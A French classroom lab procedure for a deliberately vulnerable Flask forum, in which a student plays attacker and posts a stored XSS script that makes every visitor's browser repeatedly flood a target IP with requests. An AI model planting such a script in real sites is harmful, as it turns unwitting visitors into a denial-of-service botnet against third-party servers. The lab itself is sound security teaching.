# Procédure

## Partir le serveur cible sur le poste du prof

## Partir le forum sur la machine locale (poste du prof)

- se placer dans le projet forumPassoire **cd /path/to/forumPassoire**
- lancer le serveur flask avec la commande **python3 app.py**
- valider avec un navigateur en allant sur l'adresse **http://127.0.0.1:5000**
- afficher l'adresse IP du prof pour que chaque étudiant puisse se connecter au forum

## Créer un post qui envoie des requêtes

- choisir un étudiant X, le pirate
- les autres sont les utilisateurs du forum
- X navigue vers http://127.0.0.1:5000/create_post
- X entre le code suivant dans le post:
```html
Mon message qui va s'afficher
<script>
// Send 100 requests in parallel 
const sendRequests = async () => {
    const url = 'http://10.10.39.27/';
    const requests = [];

    for (let i = 0; i < 200; i++) {
        requests.push(fetch(url, { mode: 'no-cors'}));
    }

    try {
        const responses = await Promise.all(requests);
        const results = await Promise.all(responses.map(response => response.text()));
        console.log(results);
    } catch (error) {
        console.error('Error with requests:', error);
    }
};
// Example: Send 100 requests in parallel
setInterval(sendRequests, 100);
</script>
```
- X envoie son post
- Tout le monde recharge la page du forum
